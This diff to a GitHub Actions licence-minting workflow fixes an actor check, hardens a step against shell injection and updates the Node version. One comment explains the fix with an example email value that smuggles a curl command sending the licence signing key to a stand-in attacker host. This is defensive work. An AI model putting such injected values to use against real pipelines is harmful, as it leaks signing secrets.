@@ -43,9 +43,17 @@ permissions:
 
 jobs:
   mint:
-    # Only the repo owner can trigger via repository_dispatch. workflow_dispatch
-    # is already maintainer-gated at the platform level by GitHub.
-    if: github.event_name == 'workflow_dispatch' || github.actor == github.repository_owner
+    # workflow_dispatch is already maintainer-gated by GitHub. repository_dispatch
+    # is not, so it needs an explicit actor allowlist.
+    #
+    # This used to compare github.actor against github.repository_owner, which
+    # can NEVER match here: the owner is an Organization ("brunobola-portfolio")
+    # while github.actor is always a user login. Every repository_dispatch mint
+    # was therefore skipped — and skipped is not failed, so the "Notify on
+    # failure" step never fired and the caller saw GitHub's 204 with no key ever
+    # delivered. Gate on a login instead, overridable for forks via the
+    # MINT_ACTOR repository variable.
+    if: github.event_name == 'workflow_dispatch' || github.actor == (vars.MINT_ACTOR || 'brunobola')
     runs-on: ubuntu-latest
     timeout-minutes: 10
     # LICENSE_PRIVATE_PEM is NOT at job level — it is injected only into the
@@ -59,16 +67,26 @@ jobs:
         # during Node module load would otherwise precede in-process masking.
         env:
           LICENSE_PRIVATE_PEM: ${{ secrets.LICENSE_PRIVATE_PEM }}
+          # Bound to an env var, NOT interpolated into the script below.
+          # `${{ }}` inside `run:` is substituted as raw text before the shell
+          # parses it, so a caller-supplied email like `x"; curl -d @$LICENSE_
+          # PRIVATE_PEM evil…; echo "` would execute — in the one step whose
+          # environment carries the licence signing key. Reading "$RECIPIENT"
+          # instead keeps the value data. This matters more now that
+          # docs/guides/license-keys-and-portal.md documents feeding
+          # customer-supplied addresses in via repository_dispatch.
+          RECIPIENT: ${{ inputs.email || github.event.client_payload.email }}
         run: |
           echo "::add-mask::$LICENSE_PRIVATE_PEM"
-          echo "::add-mask::${{ inputs.email || github.event.client_payload.email }}"
+          echo "::add-mask::$RECIPIENT"
       - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0  # v7.0.0
       - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020  # v7.0.0
         with:
-          # 22 to match every other workflow. The mint script's only runtime
-          # dep is `jose` (a production dep) and package.json engines allow
-          # >=20 <23, so nothing here required the older major.
-          node-version: '22'
+          # 24 to match every other workflow. The mint script's only runtime
+          # dep is `jose` (a production dep, pure JS), so this job has no
+          # native-module constraint of its own — it just tracks the project's
+          # engines range (">=22.14 <25").
+          node-version: '24'
           cache: 'npm'
       - name: Install dependencies
         # --ignore-scripts: dependency postinstall hooks are disabled so a
